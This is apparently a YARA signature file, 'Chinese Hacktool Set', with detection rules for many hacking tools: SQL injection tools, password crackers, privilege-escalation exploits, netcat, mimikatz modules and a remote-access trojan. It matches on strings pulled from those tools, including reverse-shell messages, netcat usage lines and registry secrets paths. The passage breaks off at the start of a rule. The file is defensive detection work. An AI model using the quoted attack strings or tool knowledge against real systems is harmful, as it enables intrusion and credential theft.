rule mswin_check_lm_group {
	meta:
		description = "Chinese Hacktool Set - file mswin_check_lm_group.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "115d87d7e7a3d08802a9e5fd6cd08e2ec633c367"
	strings:
		$s1 = "Valid_Global_Groups: checking group membership of '%s\\%s'." fullword ascii
		$s2 = "Usage: %s [-D domain][-G][-P][-c][-d][-h]" fullword ascii
		$s3 = "-D    default user Domain" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 380KB and all of them
}

rule WAF_Bypass {
	meta:
		description = "Chinese Hacktool Set - file WAF-Bypass.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "860a9d7aac2ce3a40ac54a4a0bd442c6b945fa4e"
	strings:
		$s1 = "Email: blacksplitn@gmail.com" fullword wide
		$s2 = "User-Agent:" fullword wide
		$s3 = "Send Failed.in RemoteThread" fullword ascii
		$s4 = "www.example.com" fullword wide
		$s5 = "Get Domain:%s IP Failed." fullword ascii
		$s6 = "Connect To Server Failed." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 7992KB and 5 of them
}

rule Guilin_veterans_cookie_spoofing_tool {
	meta:
		description = "Chinese Hacktool Set - file Guilin veterans cookie spoofing tool.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "06b1969bc35b2ee8d66f7ce8a2120d3016a00bb1"
	strings:
		$s0 = "kernel32.dll^G" fullword ascii
		$s1 = "\\.Sus\"B" fullword ascii
		$s4 = "u56Load3" fullword ascii
		$s11 = "O MYTMP(iM) VALUES (" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1387KB and all of them
}

rule MarathonTool {
	meta:
		description = "Chinese Hacktool Set - file MarathonTool.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "084a27cd3404554cc799d0e689f65880e10b59e3"
	strings:
		$s0 = "MarathonTool" ascii
		$s17 = "/Blind SQL injection tool based in heavy queries" fullword ascii
		$s18 = "SELECT UNICODE(SUBSTRING((system_user),{0},1))" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1040KB and all of them
}

rule PLUGIN_TracKid {
	meta:
		description = "Chinese Hacktool Set - file TracKid.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "a114181b334e850d4b33e9be2794f5bb0eb59a09"
	strings:
		$s0 = "E-mail: cracker_prince@163.com" fullword ascii
		$s1 = ".\\TracKid Log\\%s.txt" fullword ascii
		$s2 = "Coded by prince" fullword ascii
		$s3 = "TracKid.dll" fullword ascii
		$s4 = ".\\TracKid Log" fullword ascii
		$s5 = "%08x -- %s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 3 of them
}

rule Pc_pc2015 {
	meta:
		description = "Chinese Hacktool Set - file pc2015.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "de4f098611ac9eece91b079050b2d0b23afe0bcb"
	strings:
		$s0 = "\\svchost.exe" fullword ascii
		$s1 = "LON\\OD\\O-\\O)\\O%\\O!\\O=\\O9\\O5\\O1\\O" fullword ascii
		$s8 = "%s%08x.001" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 309KB and all of them
}

rule sekurlsa {
	meta:
		description = "Chinese Hacktool Set - file sekurlsa.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5"
	strings:
		$s1 = "Bienvenue dans un processus distant" fullword wide
		$s2 = "Format d'appel invalide : addLogonSession [idSecAppHigh] idSecAppLow Utilisateur" wide
		$s3 = "SECURITY\\Policy\\Secrets" fullword wide
		$s4 = "Injection de donn" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1150KB and all of them
}

rule mysqlfast {
	meta:
		description = "Chinese Hacktool Set - file mysqlfast.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "32b60350390fe7024af7b4b8fbf50f13306c546f"
	strings:
		$s2 = "Invalid password hash: %s" fullword ascii
		$s3 = "-= MySql Hash Cracker =- " fullword ascii
		$s4 = "Usage: %s hash" fullword ascii
		$s5 = "Hash: %08lx%08lx" fullword ascii
		$s6 = "Found pass: " fullword ascii
		$s7 = "Pass not found" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 900KB and 4 of them
}

rule DTools2_02_DTools {
	meta:
		description = "Chinese Hacktool Set - file DTools.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "9f99771427120d09ec7afa3b21a1cb9ed720af12"
	strings:
		$s0 = "kernel32.dll" ascii
		$s1 = "TSETPASSWORDFORM" fullword wide
		$s2 = "TGETNTUSERNAMEFORM" fullword wide
		$s3 = "TPORTFORM" fullword wide
		$s4 = "ShellFold" fullword ascii
		$s5 = "DefaultPHotLigh" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule dll_PacketX {
	meta:
		description = "Chinese Hacktool Set - file PacketX.dll - ActiveX wrapper for WinPcap packet capture library"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		score = 50
		hash = "3f0908e0a38512d2a4fb05a824aa0f6cf3ba3b71"
	strings:
		$s9 = "[Failed to load winpcap packet.dll." wide
		$s10 = "PacketX Version" wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1920KB and all of them
}

rule SqlDbx_zhs {
	meta:
		description = "Chinese Hacktool Set - file SqlDbx_zhs.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "e34228345498a48d7f529dbdffcd919da2dea414"
	strings:
		$s0 = "S.failed_logins \"Failed Login Attempts\", " fullword ascii
		$s7 = "SELECT ROLE, PASSWORD_REQUIRED FROM SYS.DBA_ROLES ORDER BY ROLE" fullword ascii
		$s8 = "SELECT spid 'SPID', status 'Status', db_name (dbid) 'Database', loginame 'Login'" ascii
		$s9 = "bcp.exe <:schema:>.<:table:> out \"<:file:>\" -n -S <:server:> -U <:user:> -P <:" ascii
		$s11 = "L.login_policy_name AS \"Login Policy\", " fullword ascii
		$s12 = "mailto:support@sqldbx.com" fullword ascii
		$s15 = "S.last_login_time \"Last Login\", " fullword ascii
	condition:
		uint16(0) == 0x5a4d and 4 of them
}

rule ms10048_x86 {
	meta:
		description = "Chinese Hacktool Set - file ms10048-x86.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "e57b453966e4827e2effa4e153f2923e7d058702"
	strings:
		$s1 = "[ ] Resolving PsLookupProcessByProcessId" fullword ascii
		$s2 = "The target is most likely patched." fullword ascii
		$s3 = "Dojibiron by Ronald Huizer, (c) master@h4cker.us ." fullword ascii
		$s4 = "[ ] Creating evil window" fullword ascii
		$s5 = "%sHANDLEF_INDESTROY" fullword ascii
		$s6 = "[+] Set to %d exploit half succeeded" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 4 of them
}

rule Dos_ch {
	meta:
		description = "Chinese Hacktool Set - file ch.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "60bbb87b08af840f21536b313a76646e7c1f0ea7"
	strings:
		$s0 = "/Churraskito/-->Usage: Churraskito.exe \"command\" " fullword ascii
		$s4 = "fuck,can't find WMI process PID." fullword ascii
		$s5 = "/Churraskito/-->Found token %s " fullword ascii
		$s8 = "wmiprvse.exe" fullword ascii
		$s10 = "SELECT * FROM IIsWebInfo" fullword ascii
		$s17 = "WinSta0\\Default" fullword ascii  /* Goodware String - occured 22 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 260KB and 3 of them
}

rule DUBrute_DUBrute {
	meta:
		description = "Chinese Hacktool Set - file DUBrute.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "8aaae91791bf782c92b97c6e1b0f78fb2a9f3e65"
	strings:
		$s1 = "IP - %d; Login - %d; Password - %d; Combination - %d" fullword ascii
		$s2 = "IP - 0; Login - 0; Password - 0; Combination - 0" fullword ascii
		$s3 = "Create %d IP@Loginl;Password" fullword ascii
		$s4 = "UBrute.com" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1020KB and all of them
}

rule CookieTools {
	meta:
		description = "Chinese Hacktool Set - file CookieTools.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b6a3727fe3d214f4fb03aa43fb2bc6fadc42c8be"
	strings:
		$s0 = "http://210.73.64.88/doorway/cgi-bin/getclientip.asp?IP=" fullword ascii
		$s2 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
		$s3 = "Connection Closed Gracefully.;Could not bind socket. Address and port are alread" wide
		$s8 = "OnGetPasswordP" fullword ascii
		$s12 = "http://www.chinesehack.org/" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 5000KB and 2 of them
}

rule update_PcInit {
	meta:
		description = "Chinese Hacktool Set - file PcInit.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "a6facc4453f8cd81b8c18b3b3004fa4d8e2f5344"
	strings:
		$s1 = "\\svchost.exe" fullword ascii
		$s2 = "%s%08x.001" fullword ascii
		$s3 = "Global\\ps%08x" fullword ascii
		$s4 = "drivers\\" fullword ascii /* Goodware String - occured 2 times */
		$s5 = "StrStrA" fullword ascii /* Goodware String - occured 43 times */
		$s6 = "StrToIntA" fullword ascii /* Goodware String - occured 44 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 50KB and all of them
}

rule dat_NaslLib {
	meta:
		description = "Chinese Hacktool Set - file NaslLib.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "fb0d4263118faaeed2d68e12fab24c59953e862d"
	strings:
		$s1 = "nessus_get_socket_from_connection: fd <%d> is closed" fullword ascii
		$s2 = "[*] \"%s\" completed, %d/%d/%d/%d:%d:%d - %d/%d/%d/%d:%d:%d" fullword ascii
		$s3 = "A FsSniffer backdoor seems to be running on this port%s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1360KB and all of them
}

rule Dos_1 {
	meta:
		description = "Chinese Hacktool Set - file 1.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b554f0687a12ec3a137f321cc15e052ff219f28c"
	strings:
		$s1 = "/churrasco/-->Usage: Churrasco.exe \"command to run\"" fullword ascii
		$s2 = "/churrasco/-->Done, command should have ran as SYSTEM!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule OtherTools_servu {
	meta:
		description = "Chinese Hacktool Set - file svu.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5c64e6879a9746a0d65226706e0edc7a"
	strings:
		$s0 = "MZKERNEL32.DLL" fullword ascii
		$s1 = "UpackByDwing@" fullword ascii
		$s2 = "GetProcAddress" fullword ascii
		$s3 = "WriteFile" fullword ascii
	condition:
		$s0 at 0 and filesize < 50KB and all of them
}

rule ustrrefadd {
	meta:
		description = "Chinese Hacktool Set - file ustrrefadd.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b371b122460951e74094f3db3016264c9c8a0cfa"
	strings:
		$s0 = "E-Mail  : admin@luocong.com" fullword ascii
		$s1 = "Homepage: http://www.luocong.com" fullword ascii
		$s2 = ": %d  -  " fullword ascii
		$s3 = "ustrreffix.dll" fullword ascii
		$s5 = "Ultra String Reference plugin v%d.%02d" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 320KB and all of them
}

rule XScanLib {
	meta:
		description = "Chinese Hacktool Set - file XScanLib.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "c5cb4f75cf241f5a9aea324783193433a42a13b0"
	strings:
		$s4 = "XScanLib.dll" fullword ascii
		$s6 = "Ports/%s/%d" fullword ascii
		$s8 = "DEFAULT-TCP-PORT" fullword ascii
		$s9 = "PlugCheckTcpPort" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 360KB and all of them
}

rule IDTools_For_WinXP_IdtTool {
	meta:
		description = "Chinese Hacktool Set - file IdtTool.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ebab6e4cb7ea82c8dc1fe4154e040e241f4672c6"
	strings:
		$s2 = "IdtTool.sys" fullword ascii
		$s4 = "Idt Tool bY tMd[CsP]" fullword wide
		$s6 = "\\\\.\\slIdtTool" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 25KB and all of them
}

rule GoodToolset_ms11046 {
	meta:
		description = "Chinese Hacktool Set - file ms11046.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "f8414a374011fd239a6c6d9c6ca5851cd8936409"
	strings:
		$s1 = "[*] Token system command" fullword ascii
		$s2 = "[*] command add user 90sec 90sec" fullword ascii
		$s3 = "[*] Add to Administrators success" fullword ascii
		$s4 = "[*] User has been successfully added" fullword ascii
		$s5 = "Program: %s%s%s%s%s%s%s%s%s%s%s" fullword ascii  /* Goodware String - occured 3 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 840KB and 2 of them
}

rule Cmdshell32 {
	meta:
		description = "Chinese Hacktool Set - file Cmdshell32.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "3c41116d20e06dcb179e7346901c1c11cd81c596"
	strings:
		$s1 = "cmdshell.exe" fullword wide
		$s2 = "cmdshell" fullword ascii
		$s3 = "[Root@CmdShell ~]#" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 62KB and all of them
}

rule Sniffer_analyzer_SSClone_1210_full_version {
	meta:
		description = "Chinese Hacktool Set - file Sniffer analyzer SSClone 1210 full version.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "6882125babb60bd0a7b2f1943a40b965b7a03d4e"
	strings:
		$s0 = "http://www.vip80000.com/hot/index.html" fullword ascii
		$s1 = "GetConnectString" fullword ascii
		$s2 = "CnCerT.Safe.SSClone.dll" fullword ascii
		$s3 = "(*.JPG;*.BMP;*.GIF;*.ICO;*.CUR)|*.JPG;*.BMP;*.GIF;*.ICO;*.CUR|JPG" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3580KB and all of them
}

rule x64_klock {
	meta:
		description = "Chinese Hacktool Set - file klock.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "44825e848bc3abdb6f31d0a49725bb6f498e9ccc"
	strings:
		$s1 = "Bienvenue dans un processus distant" fullword wide
		$s2 = "klock.dll" fullword ascii
		$s3 = "Erreur : le bureau courant (" fullword wide
		$s4 = "klock de mimikatz pour Windows" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 907KB and all of them
}

rule Dos_Down32 {
	meta:
		description = "Chinese Hacktool Set - file Down32.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "0365738acd728021b0ea2967c867f1014fd7dd75"
	strings:
		$s2 = "C:\\Windows\\Temp\\Cmd.txt" fullword wide
		$s6 = "down.exe" fullword wide
		$s15 = "get_Form1" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 137KB and all of them
}

rule MarathonTool_2 {
	meta:
		description = "Chinese Hacktool Set - file MarathonTool.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "75b5d25cdaa6a035981e5a33198fef0117c27c9c"
	strings:
		$s3 = "http://localhost/retomysql/pista.aspx?id_pista=1" fullword wide
		$s6 = "SELECT ASCII(SUBSTR(username,{0},1)) FROM USER_USERS" fullword wide
		$s17 = "/Blind SQL injection tool based in heavy queries" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule Tools_termsrv {
	meta:
		description = "Chinese Hacktool Set - file termsrv.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "294a693d252f8f4c85ad92ee8c618cebd94ef247"
	strings:
		$s1 = "Iv\\SmSsWinStationApiPort" fullword ascii
		$s2 = " TSInternetUser " fullword wide
		$s3 = "KvInterlockedCompareExchange" fullword ascii
		$s4 = " WINS/DNS " fullword wide
		$s5 = "winerror=%1" fullword wide
		$s6 = "TermService " fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1150KB and all of them
}

rule scanms_scanms {
	meta:
		description = "Chinese Hacktool Set - file scanms.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "47787dee6ddea2cb44ff27b6a5fd729273cea51a"
	strings:
		$s1 = "--- ScanMs Tool --- (c) 2003 Internet Security Systems ---" fullword ascii
		$s2 = "Scans for systems vulnerable to MS03-026 vuln" fullword ascii
		$s3 = "More accurate for WinXP/Win2k, less accurate for WinNT" fullword ascii /* PEStudio Blacklist: os */
		$s4 = "added %d.%d.%d.%d-%d.%d.%d.%d" fullword ascii
		$s5 = "Internet Explorer 1.0" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and 3 of them
}

rule CN_Tools_PcShare {
	meta:
		description = "Chinese Hacktool Set - file PcShare.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ee7ba9784fae413d644cdf5a093bd93b73537652"
	strings:
		$s0 = "title=%s%s-%s;id=%s;hwnd=%d;mainhwnd=%d;mainprocess=%d;cmd=%d;" fullword wide
		$s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)" fullword wide
		$s2 = "http://www.pcshares.cn/pcshare200/lostpass.asp" fullword wide
		$s5 = "port=%s;name=%s;pass=%s;" fullword wide
		$s16 = "%s\\ini\\*.dat" fullword wide
		$s17 = "pcinit.exe" fullword wide
		$s18 = "http://www.pcshare.cn" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 6000KB and 3 of them
}

rule pw_inspector {
	meta:
		description = "Chinese Hacktool Set - file pw-inspector.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "4f8e3e101098fc3da65ed06117b3cb73c0a66215"
	strings:
		$s1 = "-m MINLEN  minimum length of a valid password" fullword ascii
		$s2 = "http://www.thc.org" fullword ascii
		$s3 = "Use for hacking: trim your dictionary file to the pw requirements of the target." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 460KB and all of them
}

rule Dll_LoadEx {
	meta:
		description = "Chinese Hacktool Set - file Dll_LoadEx.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "213d9d0afb22fe723ff570cf69ff8cdb33ada150"
	strings:
		$s0 = "WiNrOOt@126.com" fullword wide
		$s1 = "Dll_LoadEx.EXE" fullword wide
		$s3 = "You Already Loaded This DLL ! :(" fullword ascii
		$s10 = "Dll_LoadEx Microsoft " fullword wide
		$s17 = "Can't Load This Dll ! :(" fullword ascii
		$s18 = "WiNrOOt" fullword wide
		$s20 = " Dll_LoadEx(&A)..." fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 120KB and 3 of them
}

rule dat_report {
	meta:
		description = "Chinese Hacktool Set - file report.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "4582a7c1d499bb96dad8e9b227e9d5de9becdfc2"
	strings:
		$s1 = "<a href=\"http://www.xfocus.net\">X-Scan</a>" fullword ascii
		$s2 = "REPORT-ANALYSIS-OF-HOST" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 480KB and all of them
}

rule Dos_iis7 {
	meta:
		description = "Chinese Hacktool Set - file iis7.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "0a173c5ece2fd4ac8ecf9510e48e95f43ab68978"
	strings:
		$s0 = "\\\\localhost" fullword ascii
		$s1 = "iis.run" fullword ascii
		$s3 = ">Could not connecto %s" fullword ascii
		$s5 = "WHOAMI" ascii
		$s13 = "WinSta0\\Default" fullword ascii  /* Goodware String - occured 22 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 140KB and all of them
}

rule SwitchSniffer {
	meta:
		description = "Chinese Hacktool Set - file SwitchSniffer.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "1e7507162154f67dff4417f1f5d18b4ade5cf0cd"
	strings:
		$s0 = "NextSecurity.NET" fullword wide
		$s2 = "SwitchSniffer Setup" fullword wide
	condition:
		uint16(0) == 0x5a4d and all of them
}

rule dbexpora {
	meta:
		description = "Chinese Hacktool Set - file dbexpora.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b55b007ef091b2f33f7042814614564625a8c79f"
	strings:
		$s0 = "SELECT A.USER FROM SYS.USER_USERS A " fullword ascii
		$s12 = "OCI 8 - OCIDescriptorFree" fullword ascii
		$s13 = "ORACommand *" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 835KB and all of them
}

rule SQLCracker {
	meta:
		description = "Chinese Hacktool Set - file SQLCracker.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "1aa5755da1a9b050c4c49fc5c58fa133b8380410"
	strings:
		$s0 = "msvbvm60.dll" fullword ascii /* reversed goodware string 'lld.06mvbvsm' */
		$s1 = "_CIcos" fullword ascii
		$s2 = "kernel32.dll" fullword ascii
		$s3 = "cKmhV" fullword ascii
		$s4 = "080404B0" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 125KB and all of them
}

rule FreeVersion_debug {
	meta:
		description = "Chinese Hacktool Set - file debug.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "d11e6c6f675b3be86e37e50184dadf0081506a89"
	strings:
		$s0 = "c:\\Documents and Settings\\Administrator\\" fullword ascii
		$s1 = "Got WMI process Pid: %d" ascii
		$s2 = "This exploit will execute" ascii
		$s6 = "Found token %s " ascii
		$s7 = "Running reverse shell" ascii
		$s10 = "wmiprvse.exe" fullword ascii
		$s12 = "SELECT * FROM IIsWebInfo" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 820KB and 3 of them
}

rule Dos_look {
	meta:
		description = "Chinese Hacktool Set - file look.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "e1a37f31170e812185cf00a838835ee59b8f64ba"
	strings:
		$s1 = "<description>CHKen QQ:41901298</description>" fullword ascii
		$s2 = "version=\"9.9.9.9\"" fullword ascii
		$s3 = "name=\"CH.Ken.Tool\"" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 40KB and all of them
}

rule NtGodMode {
	meta:
		description = "Chinese Hacktool Set - file NtGodMode.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "8baac735e37523d28fdb6e736d03c67274f7db77"
	strings:
		$s0 = "to HOST!" fullword ascii
		$s1 = "SS.EXE" fullword ascii
		$s5 = "lstrlen0" fullword ascii
		$s6 = "Virtual" fullword ascii  /* Goodware String - occured 6 times */
		$s19 = "RtlUnw" fullword ascii /* Goodware String - occured 1 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 45KB and all of them
}

rule Dos_NC {
	meta:
		description = "Chinese Hacktool Set - file NC.EXE"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "57f0839433234285cc9df96198a6ca58248a4707"
	strings:
		$s1 = "nc -l -p port [options] [hostname] [port]" fullword ascii
		$s2 = "invalid connection to [%s] from %s [%s] %d" fullword ascii
		$s3 = "post-rcv getsockname failed" fullword ascii
		$s4 = "Failed to execute shell, error = %s" fullword ascii
		$s5 = "UDP listen needs -p arg" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 290KB and all of them
}

rule WebCrack4_RouterPasswordCracking {
	meta:
		description = "Chinese Hacktool Set - file WebCrack4-RouterPasswordCracking.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "00c68d1b1aa655dfd5bb693c13cdda9dbd34c638"
	strings:
		$s0 = "http://www.site.com/test.dll?user=%USERNAME&pass=%PASSWORD" fullword ascii
		$s1 = "Username: \"%s\", Password: \"%s\", Remarks: \"%s\"" fullword ascii
		$s14 = "user:\"%s\" pass: \"%s\" result=\"%s\"" fullword ascii
		$s16 = "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)" fullword ascii
		$s20 = "List count out of bounds (%d)+Operation not allowed on sorted string list%String" wide
	condition:
		uint16(0) == 0x5a4d and filesize < 5000KB and 2 of them
}

rule HScan_v1_20_oncrpc {
	meta:
		description = "Chinese Hacktool Set - file oncrpc.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "e8f047eed8d4f6d2f5dbaffdd0e6e4a09c5298a2"
	strings:
		$s1 = "clnt_raw.c - Fatal header serialization error." fullword ascii
		$s2 = "svctcp_.c - cannot getsockname or listen" fullword ascii
		$s3 = "too many connections (%d), compilation constant FD_SETSIZE was only %d" fullword ascii
		$s4 = "svc_run: - select failed" fullword ascii
		$s5 = "@(#)bindresvport.c" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 340KB and 4 of them
}

rule hscan_gui {
	meta:
		description = "Chinese Hacktool Set - file hscan-gui.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "1885f0b7be87f51c304b39bc04b9423539825c69"
	strings:
		$s0 = "Hscan.EXE" fullword wide
		$s1 = "RestTool.EXE" fullword ascii
		$s3 = "Hscan Application " fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 550KB and all of them
}

rule S_MultiFunction_Scanners_s {
	meta:
		description = "Chinese Hacktool Set - file s.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "79b60ffa1c0f73b3c47e72118e0f600fcd86b355"
	strings:
		$s0 = "C:\\WINDOWS\\temp\\pojie.exe /l=" fullword ascii
		$s1 = "C:\\WINDOWS\\temp\\s.exe" fullword ascii
		$s2 = "C:\\WINDOWS\\temp\\s.exe tcp " fullword ascii
		$s3 = "explorer.exe http://www.hackdos.com" fullword ascii
		$s4 = "C:\\WINDOWS\\temp\\pojie.exe" fullword ascii
		$s5 = "Failed to read file or invalid data in file!" fullword ascii
		$s6 = "www.hackdos.com" fullword ascii
		$s7 = "WTNE / MADE BY E COMPILER - WUTAO " fullword ascii
		$s11 = "The interface of kernel library is invalid!" fullword ascii
		$s12 = "eventvwr" fullword ascii
		$s13 = "Failed to decompress data!" fullword ascii
		$s14 = "NOTEPAD.EXE result.txt" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 8000KB and 4 of them
}

rule Dos_GetPass {
	meta:
		description = "Chinese Hacktool Set - file GetPass.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "d18d952b24110b83abd17e042f9deee679de6a1a"
	strings:
		$s0 = "GetLogonS" ascii
		$s3 = "/showthread.php?t=156643" ascii
		$s8 = "To Run As Administ" ascii
		$s18 = "EnableDebugPrivileg" fullword ascii
		$s19 = "sedebugnameValue" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 890KB and all of them
}

rule update_PcMain {
	meta:
		description = "Chinese Hacktool Set - file PcMain.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "aa68323aaec0269b0f7e697e69cce4d00a949caa"
	strings:
		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322" ascii
		$s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost" fullword ascii
		$s2 = "SOFTWARE\\Classes\\HTTP\\shell\\open\\command" fullword ascii
		$s3 = "\\svchost.exe -k " fullword ascii
		$s4 = "SYSTEM\\ControlSet001\\Services\\%s" fullword ascii
		$s9 = "Global\\%s-key-event" fullword ascii
		$s10 = "%d%d.exe" fullword ascii
		$s14 = "%d.exe" fullword ascii
		$s15 = "Global\\%s-key-metux" fullword ascii
		$s18 = "GET / HTTP/1.1" fullword ascii
		$s19 = "\\Services\\" fullword ascii
		$s20 = "qy001id=%d;qy001guid=%s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and 4 of them
}

rule Dos_sys {
	meta:
		description = "Chinese Hacktool Set - file sys.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b5837047443f8bc62284a0045982aaae8bab6f18"
	strings:
		$s0 = "'SeDebugPrivilegeOpen " fullword ascii
		$s6 = "Author: Cyg07*2" fullword ascii
		$s12 = "from golds7n[LAG]'J" fullword ascii
		$s14 = "DAMAGE" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 150KB and all of them
}

rule dat_xpf {
